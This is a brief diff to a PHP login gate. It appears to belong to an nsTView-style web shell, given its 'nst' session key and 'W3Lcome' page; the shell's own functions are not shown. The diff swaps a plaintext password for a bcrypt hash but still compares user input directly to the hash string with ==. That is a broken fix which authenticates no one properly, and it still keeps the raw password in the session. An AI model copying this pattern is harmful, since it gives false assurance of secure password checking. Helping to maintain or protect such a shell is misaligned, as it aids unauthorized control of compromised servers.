@@ -6,18 +6,18 @@
 
 @$pass = $_POST['pass'];
 $chk_login = true;
-$password = "good121";
+$hashed_password = '$2y$10$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36IMq2Bzskvsq7cdEc9lbF2';
 
 //END CONFIGURATION
 
-if($pass == $password)
+if($pass == $hashed_password)
 {
  $_SESSION['nst'] = "$pass";
 }
 
 if($chk_login == true)
 {
- if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
+ if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $hashed_password)
  {
  die("
   <title>W3Lcome</title>
